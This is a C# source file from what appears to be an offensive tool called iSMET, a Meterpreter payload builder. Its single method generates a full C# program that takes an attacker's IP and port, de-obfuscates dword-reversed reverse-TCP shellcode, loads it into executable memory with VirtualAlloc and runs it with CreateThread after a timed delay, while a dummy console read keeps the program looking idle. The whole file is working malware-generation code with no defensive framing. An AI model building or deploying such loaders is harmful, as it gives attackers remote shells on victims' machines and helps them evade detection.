using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using iSMET.ShellCode;

namespace iSMET.CSharp.Collection
{
    //    ██╗███████╗███╗   ███╗███████╗████████╗    ██╗   ██╗██████╗    ██╗
    //    ██║██╔════╝████╗ ████║██╔════╝╚══██╔══╝    ██║   ██║╚════██╗  ███║
    //    ██║███████╗██╔████╔██║█████╗     ██║       ██║   ██║ █████╔╝  ╚██║
    //    ██║╚════██║██║╚██╔╝██║██╔══╝     ██║       ╚██╗ ██╔╝██╔═══╝    ██║
    //    ██║███████║██║ ╚═╝ ██║███████╗   ██║        ╚████╔╝ ███████╗██╗██║
    //    ╚═╝╚══════╝╚═╝     ╚═╝╚══════╝   ╚═╝         ╚═══╝  ╚══════╝╚═╝╚═╝
    // iSMET - (A)Symmetric Meterpreter Encryption Tool v2.1
    // Author: @mindspoof - @PriviaSec
    public class SourceCode
    {
        public class Console
        {
            DwordShellCode.x86DwordShellCode dwShellCode = new DwordShellCode.x86DwordShellCode();

            public string Consolex86ReverseTcp(string Ip, string Port, int TimeOut)
            {
                return
                    "using System; using System.Linq; using System.Runtime.InteropServices; using System.Threading; using System.Threading.Tasks; namespace iSMET_Meterpreter_Builder { class Program { static void Main(string[] args) { Task.Factory.StartNew(() => RunMeterpreter()); var str = Convert.ToString(Console.ReadLine()); } public static void RunMeterpreter() { try { Thread.Sleep(" +
                    TimeOut + "); var strShellCode = string.Empty; string shellCode = \"" +
                    dwShellCode.ReverseTcp(Ip, Port)+"\"; var strReplace = shellCode.Replace(\",\",\"\").Replace(\"0x\",\"\"); string[] strSplitter = strReplace.Split(' '); for (int i = 0; i < strSplitter.Length-1; i++) { strShellCode += ReverseDwordString(strSplitter[i]); } string newShellCode = strShellCode.Substring(0, strShellCode.Length - 1); string newShellCode2 = newShellCode.Replace(\"0x\", \"\").Replace(\",\",\"\"); byte[] shellcode = StringToByteArray(newShellCode2); UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length, 0x1000, 0x40); Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length); IntPtr hThread = IntPtr.Zero; UInt32 threadId = 0; IntPtr pinfo = IntPtr.Zero; hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId); WaitForSingleObject(hThread, 0xFFFFFFFF); return; } catch (Exception e) { Console.WriteLine(e); throw; } } public static string ReverseDwordString(string s) { char[] array = s.ToCharArray(); char[] array2 = new char[8]; array2[0] = array[6]; array2[1] = array[7]; array2[2] = array[4]; array2[3] = array[5]; array2[4] = array[2]; array2[5] = array[3]; array2[6] = array[0]; array2[7] = array[1]; string scode0 = \"0x\" + array2[0] + array2[1]; string scode1 = \"0x\" + array2[2] + array2[3]; string scode2 = \"0x\" + array2[4] + array2[5]; string scode3 = \"0x\" + array2[6] + array2[7]; string restoreString = scode0 + \",\" + scode1 + \",\" + scode2 + \",\" + scode3 + \",\"; return restoreString; } public static byte[] StringToByteArray(string hex) { return Enumerable.Range(0, hex.Length) .Where(x => x % 2 == 0) .Select(x => Convert.ToByte(hex.Substring(x, 2), 16)) .ToArray(); } [DllImport(\"kernel32\")] private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect); [DllImport(\"kernel32\")] private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId); [DllImport(\"kernel32\")] private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds); } } ";
            }
        }
    }
}
